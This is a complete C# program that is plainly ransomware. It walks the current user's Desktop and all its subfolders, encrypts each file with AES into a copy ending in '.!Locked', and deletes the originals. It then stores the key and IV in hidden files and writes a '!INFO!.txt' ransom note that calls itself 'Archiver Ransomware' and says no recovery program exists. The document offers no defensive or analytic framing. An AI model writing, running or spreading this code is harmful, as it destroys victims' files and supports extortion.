using System;
using System.IO;
using System.Security.Cryptography;

class Program
{
    static void Main(string[] args)
    {
        // Encryption directory path
        string directoryPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

        // Get all files in the directory
        string[] filePaths = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);

        // Check if there are files to encrypt
        if (filePaths.Length == 0)
        {
            Console.WriteLine("There are no files to encrypt.");
            return;
        }

        // Create an instance of the AES encryption algorithm
        using (Aes aes = Aes.Create())
        {
            // Generate encryption key and initialization vector
            byte[] key = aes.Key;
            byte[] iv = aes.IV;

            // Encrypt all files in the directory
            foreach (string filePath in filePaths)
            {
                // Separate file name and extension
                string fileName = Path.GetFileNameWithoutExtension(filePath);
                string fileExtension = Path.GetExtension(filePath);

                // Create encrypted file path
                string encryptedFilePath = Path.Combine(Path.GetDirectoryName(filePath), fileName + fileExtension + ".!Locked");

                // Create file streams
                using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (FileStream encryptedFileStream = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.Read))
                    {
                        // Create encryption stream
                        using (ICryptoTransform encryptor = aes.CreateEncryptor())
                        {
                            // Encrypt the file contents and write to the encrypted file stream
                            using (CryptoStream cryptoStream = new CryptoStream(encryptedFileStream, encryptor, CryptoStreamMode.Write))
                            {
                                inputFileStream.CopyTo(cryptoStream);
                            }
                        }
                    }
                }

                // Delete or move the original file
                File.Delete(filePath); // Delete the file
                // File.Move(filePath, Path.Combine(directoryPath, fileName + "_backup" + fileExtension)); // Move the file
            }

            // Save encryption key and initialization vector to files and hide them
            string keyFilePath = Path.Combine(directoryPath, "key.bin");
            string ivFilePath = Path.Combine(directoryPath, "iv.bin");
            File.WriteAllBytes(keyFilePath, key);
            File.WriteAllBytes(ivFilePath, iv);
            File.SetAttributes(keyFilePath, File.GetAttributes(keyFilePath) | FileAttributes.Hidden);
            File.SetAttributes(ivFilePath, File.GetAttributes(ivFilePath) | FileAttributes.Hidden);
            // Create !INFO!.txt file with ransom note
            string infoFilePath = Path.Combine(directoryPath, "!INFO!.txt");
            string[] lines = { "Your file is Locked by Archiver Ransomware", "This Ransomware is No have Recover Program", "Enjoy!" };
            File.WriteAllLines(infoFilePath, lines);
        }
    }
}
